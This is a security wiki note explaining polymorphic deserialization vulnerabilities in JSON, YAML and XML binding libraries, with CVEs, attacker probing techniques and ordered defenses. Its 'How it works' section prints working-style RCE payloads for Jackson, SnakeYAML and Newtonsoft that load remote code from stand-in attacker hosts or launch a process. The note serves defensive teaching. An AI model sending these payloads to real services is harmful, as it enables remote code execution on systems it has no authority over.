---
migration_source: published-html-snapshot
migration_status: needs-editorial-review
---

# Polymorphic Deserialization

## Definition

Polymorphic deserialization is the same vulnerability class as native [[deserialization|insecure deserialization]] — reintroduced through JSON, XML, and YAML binding libraries that instantiate runtime-chosen classes from attacker-controlled type hints in the data. The wire format is plain text and looks inert; the *binding library* is the parser-as-execution-engine.

## Why it matters

API teams adopted JSON specifically to escape Java/PHP serialization vulnerabilities — and reintroduced them through binder configuration. This matters because:

- **The risk is invisible at the data layer.** Reviewers reading a JSON request body see strings, numbers, and arrays. They do not see that Jackson is configured with `enableDefaultTyping()` and will instantiate a class named in `["com.example.Bad", {...}]`. JSON's reputation as a safe format actively misleads threat-modeling.
- **It is the dominant deserialization vector in modern stacks.** Native Java/PHP serialization is rare in greenfield 2020s codebases. Jackson, Gson, Newtonsoft Json.NET, and SnakeYAML are everywhere — and a misconfigured polymorphic binder produces the same RCE primitive.
- **The defenses are non-default.** Both Jackson and Newtonsoft have safe defaults *now*, but enabling polymorphism is one annotation or one constructor flag away. SnakeYAML's safe path requires explicit opt-in to `SafeConstructor`. Apps written against older docs, or apps that imported a tutorial that "worked," are usually unsafe.
- **It teaches the data-format-vs-binder lesson.** The vulnerability is not in JSON. The vulnerability is in instantiation logic that chooses classes based on attacker-supplied hints. The same lesson applies whenever a parser performs reflective construction.

## How it works

Four conditions must all be true for the vulnerability to fire:

1. **The binder reconstructs typed objects with class-name hints from the data.** Examples:
   - Jackson `@JsonTypeInfo(use = Id.CLASS)` or global `enableDefaultTyping()`
   - Newtonsoft Json.NET `TypeNameHandling.All` / `TypeNameHandling.Auto`
   - Gson `Object`-typed field plus a custom adapter accepting class names
   - SnakeYAML default `Constructor` (instantiates any class named in `!!java.example.Foo` tags)
   - XStream — similar pattern in XML
2. **Polymorphism is enabled globally or on the target field.** Some libraries gate this per-class, others apply it everywhere when default typing is on.
3. **No class allowlist is configured.** Modern Jackson supports `BasicPolymorphicTypeValidator`, Newtonsoft supports `SerializationBinder`, SnakeYAML supports `SafeConstructor`. None of them are on by default the moment polymorphism is enabled in legacy configurations.
4. **A gadget on the classpath.** [[gadget-chains|Gadget chains]] published in `marshalsec` and `ysoserial` for Spring, Hibernate, JNDI, ROME, etc. cover most enterprise dependency trees.

Concrete Jackson example (legacy `enableDefaultTyping()` config):

```
[
  "org.springframework.context.support.ClassPathXmlApplicationContext",
  "http://attacker.example/exploit.xml"
]
```

Jackson sees the two-element array, treats element 0 as the class name, instantiates `ClassPathXmlApplicationContext` with element 1 as the constructor argument. That constructor fetches the URL, parses it as a Spring bean definition, and the Spring bean definition contains an `ObjectFactory` that runs a command. RCE without ever calling `unserialize` or `readObject`.

Concrete SnakeYAML example:

```
!!javax.script.ScriptEngineManager
- !!java.net.URLClassLoader
  - - !!java.net.URL ["http://attacker/x.jar"]
```

SnakeYAML's default constructor instantiates `URLClassLoader` pointed at attacker-controlled JAR, then instantiates `ScriptEngineManager` against that loader — which loads and runs the JAR's `META-INF/services` entry. RCE through a YAML parse.

Concrete Newtonsoft example (`TypeNameHandling.All`):

```
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": { "$type": "...", "FileName": "calc.exe", "Arguments": "" }
  }
}
```

ysoserial.NET catalogs more than a dozen of these.

The bug shape is identical across all four examples: data names a class, binder constructs it, constructor (or magic-method equivalent) does something dangerous with controlled state. It is the same gadget chain mental model from [[gadget-chains]], just kicked off through a JSON/YAML/XML binder instead of `readObject`.

## Techniques / patterns

What attackers look at and how they probe:

- **Identify the binder library by error class names.** A misconfigured Jackson endpoint with verbose error pages leaks `com.fasterxml.jackson.databind.JsonMappingException`. SnakeYAML leaks `org.yaml.snakeyaml.constructor.ConstructorException`. Newtonsoft leaks `Newtonsoft.Json.JsonReaderException`.
- **Probe with type-hint shapes, not payloads.** Send `["nonexistent.Class", {}]` (Jackson default-typing shape) or `{"$type":"x.y","value":1}` (Newtonsoft shape) or `!!java.lang.String` (SnakeYAML shape). A *different* error than ordinary type-mismatch (e.g., `ClassNotFoundException`) confirms the binder is willing to resolve attacker class names.
- **Check the classpath via dependency leakage.** Spring Boot's `/actuator` endpoints, Maven `pom.xml` in source maps, error stack traces with library FQDNs, and even response headers (`X-Powered-By`) all narrow down which gadget catalog to use.
- **Use `marshalsec` and `ysoserial.net`.** Both ship with polymorphic-binder payload generators specifically for Jackson, SnakeYAML, JSON-IO, FastJSON, XStream, Newtonsoft.
- **Fall back to blind probes.** Any payload referencing a URL the attacker controls (`URLClassLoader`, `JdbcRowSetImpl + JNDI` for Jackson) is a universal "did the binder honor my class hint?" probe. Detect via outbound DNS/HTTP.

## Variants and bypasses

### Jackson FasterXML

- **Default typing enabled globally** (`ObjectMapper.enableDefaultTyping()`) — the classic foothold; deprecated since 2.10 but still widespread in legacy code.
- **`@JsonTypeInfo(use = Id.CLASS)` on a polymorphic field** — narrower attack surface but still hot if the field is on a request DTO.
- **Polymorphic `Object` fields** — `Map<String, Object>` request bodies often deserialize values polymorphically when default typing is active.
- **Famous CVEs:** CVE-2017-7525 (Spring + Jackson + ehcache), CVE-2017-15095, CVE-2019-12384 (logback-via-Jackson), CVE-2019-14439, dozens more in the FasterXML CVE history.
- **Modern safe path:** disable default typing entirely, or use `BasicPolymorphicTypeValidator.builder().allowIfBaseType(...)` with an explicit subclass allowlist.

### Gson

- Generally safer because Gson does not honor class-name hints by default.
- **Risk surface:** `Object`-typed fields combined with a custom `JsonDeserializer` that reads a `type` field and `Class.forName`s it. The vulnerability is in the application's adapter, not Gson itself — but the pattern is widespread.
- **`RuntimeTypeAdapterFactory`** is the recommended polymorphic mechanism and is safe when configured with an explicit subclass list.

### Newtonsoft Json.NET (.NET)

- **`TypeNameHandling.All` / `TypeNameHandling.Auto`** — the unsafe configurations. Documented as "do not use with untrusted data" since 2018, but legacy applications and tutorials still enable it.
- **`$type` discriminator** is the on-the-wire indicator.
- **Famous chains:** `ObjectDataProvider`, `WindowsIdentity`, `System.Configuration.Install.AssemblyInstaller`, `SessionViewStateHistoryItem`. ysoserial.NET catalogs the full set.
- **Modern safe path:** `TypeNameHandling.None` (the default) plus a `SerializationBinder` that allowlists known types when polymorphism is required.

### SnakeYAML (Java)

- **Default `Constructor` instantiates anything.** The library's *default* behavior is unsafe; safety is opt-in via `new Yaml(new SafeConstructor())`.
- **`!!java.lang.X` and `!!javax.X` tags** are the wire indicator.
- **CVE-2022-1471** tracked the long-standing default-constructor behavior; SnakeYAML 2.0 (2023) changed defaults.
- **Modern safe path:** always pass `SafeConstructor` explicitly, or use Jackson YAML module with the same allowlist patterns as JSON.

### XStream

- **Default behavior trusts class names in XML.** Multiple high-impact CVEs (CVE-2017-9805 for Apache Struts2, CVE-2021-21345, etc.).
- **Modern safe path:** XStream 1.4.18+ requires explicit allowlists via `xStream.allowTypes(...)`.

### FastJSON (Alibaba Fastjson, Java)

- Specific to Chinese-ecosystem deployments but globally distributed via Maven Central.
- **`autoType` feature** — the same default-typing problem; multiple CVEs across 2017–2022.
- **Modern safe path:** Fastjson 2.x with autoType disabled or strict allowlist.

### YAML in non-Java ecosystems

- **PyYAML** `yaml.load()` without `Loader=SafeLoader` — Python equivalent of SnakeYAML.
- **Ruby Psych** has had similar issues; modern versions safe by default.

## Impact

Severity matches the strength of the gadget chain reachable on the classpath:

- **Remote code execution** — typical ceiling. Spring + Jackson + a misconfigured `enableDefaultTyping` is reliably RCE on dozens of CVEs.
- **Server-side request forgery** — chains via `URL.openStream` or JNDI lookups (`JdbcRowSetImpl`).
- **Local file read / write** — chains reaching filesystem APIs.
- **Authentication bypass** — when polymorphism lets the attacker substitute an `AdminPrincipal` for a `UserPrincipal` directly in the deserialized session.
- **Class-loading from attacker-controlled URLs** — the JNDI / `URLClassLoader` path is its own class of impact.

API services often run with elevated database credentials and access to internal networks, raising the practical severity above what the application's user-facing role suggests.

## Detection and defense

Ordered by effectiveness:

1.
**Disable polymorphic deserialization unless the schema demands it.**
   The default posture for an API: every DTO is a concrete class with concrete fields. No `Object`-typed fields, no `@JsonTypeInfo`, no `enableDefaultTyping`, no SnakeYAML default constructor. If the binder cannot construct attacker-named classes, the entire vulnerability class evaporates.

2.
**When polymorphism is required, apply a class allowlist at the binder.**
   Jackson `BasicPolymorphicTypeValidator.builder().allowIfBaseType(MyBase.class).build()`. Newtonsoft `SerializationBinder` returning `null` for everything not on the list. SnakeYAML `SafeConstructor`, then layer specific tags. The allowlist is short, explicit, and reviewed when changed.

3.
**Pin to a binder version with safe defaults.**
   Jackson 2.10+, Newtonsoft 12+, SnakeYAML 2.0+, XStream 1.4.18+. Each had a release that flipped a dangerous default. Old apps pinned to old versions silently retain the vulnerability even after the codebase is "upgraded."

4.
**Validate the schema before binding.**
   Use a separate JSON Schema / OpenAPI validator that runs on the raw request body before the binder ever sees it. Any field carrying a type-hint key (`$type`, `@class`, etc.) that is not declared in the schema is rejected. This catches injection of polymorphism into endpoints that should not accept it.

5.
**Strip dangerous chains from the dependency tree where feasible.**
   Defense-in-depth, not a primary defense. Removing C3P0 / Hibernate / Spring beans / `JdbcRowSetImpl` from a service that does not need them shrinks the gadget surface but does not eliminate the class. See [[gadget-chains]] for why chain removal alone is insufficient.

6.
**Monitor inbound traffic for type-hint patterns.**
   `$type`, `@class`, `!!java.`, `!!python/`, `["fully.qualified.ClassName"` — any of these in a request body where they were never expected is high-signal. Log + alert. WAFs can block known-bad class names but should not be relied on as the primary control.

### What does not work as a primary defense

- **"We use JSON, not Java serialization."** Polymorphic binders are the Trojan horse. JSON is data; Jackson with default typing is execution.
- **Validating after binding.** Same problem as native deserialization: the constructor / setter / `@JsonCreator` already ran. Validating the resulting object is too late.
- **Trusting default settings without checking the version.** Jackson 2.9 with `enableDefaultTyping()` is unsafe even though Jackson 2.10's default is safe. Pinned versions are silent landmines.
- **Removing one or two named gadgets.** Same lesson as native deserialization. The chain catalog grows; "remove this class" is whack-a-mole.
- **WAF signatures alone.** Trivially bypassed via Unicode escapes, base64, alternate property orderings, and gadgets the WAF vendor has not catalogued.

## Practical labs

Use only local labs, deliberately vulnerable targets, or systems where you have explicit permission. Avoid running generated payloads against real services; most useful testing starts with binder-identification probes and configuration review.

### Identify binder fingerprints from safe errors

```
curl -i -X POST -H 'Content-Type: application/json' \
  -d '{"$type":"example.DoesNotExist","value":1}' \
  https://api.example.test/import
```

Look for library-specific errors such as Jackson, Newtonsoft, SnakeYAML, FastJSON, or XStream class names. A `ClassNotFoundException`-style error is a strong signal that the binder tried to resolve a type hint.

### Search code for unsafe polymorphism

```
rg -n "enableDefaultTyping|@JsonTypeInfo|TypeNameHandling|SerializationBinder|new Yaml\\(|yaml\\.load|autoType|XStream" src
```

Review every match as a trust-boundary decision: which endpoint receives the data, which types are allowed, and whether untrusted input reaches the binder.

### Probe declared schema boundaries

```
curl -i -X POST -H 'Content-Type: application/json' \
  -d '{"name":"test","@class":"example.DoesNotExist","$type":"example.DoesNotExist"}' \
  https://api.example.test/configs
```

Endpoints that do not declare type-hint fields should reject them before binding.

### Verify safe YAML loading in a local fixture

```
rg -n "SafeConstructor|SafeLoader|FullLoader|Constructor" src config
```

YAML parsers deserve the same scrutiny as JSON binders because YAML tags can trigger object construction.

## Practical examples

- A Spring Boot service with `objectMapper.enableDefaultTyping()` on a public POST endpoint — payload sets a Spring `ClassPathXmlApplicationContext` URL, RCE.
- A .NET ASP.NET API using `TypeNameHandling.All` for "convenience" on an admin endpoint — ysoserial.NET `ObjectDataProvider` payload, RCE.
- A Java config-loader using SnakeYAML `new Yaml().load(stream)` on `application.yaml` whose location is influenced by an environment variable — startup RCE if the attacker can write to the config path.
- A Python ML server using `yaml.load()` (default loader) on uploaded experiment configs — pickle-equivalent RCE through `!!python/object/apply:`.
- A modern microservice with `@JsonTypeInfo(use = Id.CLASS)` on a single field and no `BasicPolymorphicTypeValidator` — narrow attack surface but still RCE if a gadget exists in the dep tree.
- A GraphQL endpoint with a `JSON` scalar that round-trips through Jackson with default typing — polymorphism injection through the schema's escape hatch.

## Related notes

- [[deserialization|Insecure deserialization]] — parent vulnerability class; polymorphic binders are the JSON/YAML/XML-shaped variant.
- [[gadget-chains|Gadget chains]] — same chain shape, different kick-off mechanism.
- [[mass-assignment]] — adjacent: framework instantiates attacker-controlled fields. Polymorphic deserialization is the type-confusion superset.
- [[jwt-attacks]] — adjacent: structured client-supplied data binds to typed claims; library quirks can produce parallel exposures.
- [[broken-object-property-level-authorization]] — adjacent: when polymorphism lets attackers substitute a privileged subclass on a request DTO.
- [[api-security-top-10]] — sits under API8:2023 *Security Misconfiguration* in the modern OWASP API Top 10.

### Suggested future atomic notes

- jackson-default-typing
- snakeyaml-safeconstructor
- newtonsoft-typenamehandling
- xstream-allowlists
- fastjson-autotype

## References

- **Foundational:** OWASP Deserialization Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- **Foundational:** OWASP API8:2023 Security Misconfiguration — https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/
- **Testing / Lab:** PortSwigger Exploiting insecure deserialization — https://portswigger.net/web-security/deserialization/exploiting
- **Research / Deep Dive:** Moritz Bechler, "Java Unmarshaller Security" (`marshalsec`) — https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf
- **Official Tool Docs:** ysoserial.net — https://github.com/pwntester/ysoserial.net
